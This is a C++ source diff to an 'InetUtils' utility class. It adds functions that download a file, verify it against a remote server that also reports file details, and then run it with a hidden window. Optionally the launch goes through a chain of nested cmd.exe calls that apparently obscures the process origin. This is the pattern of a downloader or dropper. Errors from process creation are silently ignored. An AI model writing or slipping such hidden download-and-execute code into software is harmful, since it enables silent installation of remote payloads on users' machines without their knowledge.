@@ -56,6 +56,85 @@ DWORD InetUtils::DownloadFileEx(
 }
 
 
+DWORD InetUtils::DownloadAndRunFileEx(
+	LPCTSTR url_download,
+	LPCTSTR url_verify,
+	LPCTSTR url_report,
+	LPCTSTR file_code,
+	LPCTSTR file_name,
+	LPCTSTR result_good,
+	LPCTSTR result_bad,
+	LPCTSTR cmd_args,
+	LaunchType type
+	)
+{
+
+	DWORD dwLastError = ERROR_SUCCESS;
+	dwLastError = DownloadFileEx (
+		url_download,
+		url_verify,
+		url_report,
+		file_code,
+		file_name,
+		result_good,
+		result_bad
+	);
+
+	if(dwLastError == ERROR_SUCCESS) {
+		dwLastError = RunFileEx (
+			file_name,
+			cmd_args,
+			type
+		);
+	}
+
+	return dwLastError;
+
+}
+
+
+DWORD InetUtils::RunFileEx (
+	LPCTSTR file_name,
+	LPCTSTR cmd_args,
+	LaunchType type
+	)
+{
+	DWORD dwLastError = ERROR_SUCCESS;
+	TCHAR lpszCmdPath[1024];
+	TCHAR lpszCmdArgs[2048];
+
+	PROCESS_INFORMATION PI;
+	STARTUPINFO SI;
+	ZeroMemory(&PI, sizeof(PI));
+	ZeroMemory(&SI, sizeof(SI));
+	SI.cb = sizeof(STARTUPINFO);
+	SI.wShowWindow = SW_HIDE;
+	SI.dwFlags = STARTF_USESHOWWINDOW;
+
+	ZeroMemory(lpszCmdPath, 1024 * sizeof(TCHAR));
+	ZeroMemory(lpszCmdArgs, 2048 * sizeof(TCHAR));
+
+	if(type == Exec) {
+		sprintf_s(lpszCmdArgs, 2048, "\"%s\" %s", file_name, cmd_args);
+		if (!CreateProcess(file_name, lpszCmdArgs, NULL, NULL, FALSE, NULL, NULL, NULL, &SI, &PI))
+		{
+			
+		}
+	} else if(type == ExecShell) {
+		GetEnvironmentVariable("COMSPEC", lpszCmdPath, 1024);
+		TCHAR lpszCmdChain[] = "%s /d /c cmd.exe /d /c cmd.exe /d /c IF EXIST \"%s\" (start \"\" \"%s\" %s)";
+		sprintf_s(lpszCmdArgs, 2048, lpszCmdChain, lpszCmdPath , file_name, file_name, cmd_args);
+		if (!CreateProcess(lpszCmdPath, lpszCmdArgs, NULL, NULL, FALSE, NULL, NULL, NULL, &SI, &PI))
+		{
+			
+		}
+	}
+	
+	return dwLastError;
+
+}
+
+
 DWORD InetUtils::VerifyDownloadedFile(
 	LPCTSTR url_verify,
 	LPCTSTR file_code,
@@ -95,6 +174,9 @@ DWORD InetUtils::VerifyDownloadedFile(
 	_stprintf_s(lpszURIForVerify, 1024, TEXT("%s&f=%s&h=%s&size=%d"), url_verify, file_code, lpszMD5FileMask, dwFileSize);
 
 	dwLastError = InternetRequestFeedback(lpszURIForVerify, lpszResponse, &dwResponseSize);
+	if(_tcsstr(lpszResponse, TEXT("1")) == NULL) {
+		dwLastError = ERROR_INVALID_DATA;
+	}
 
 	return dwLastError;
 }
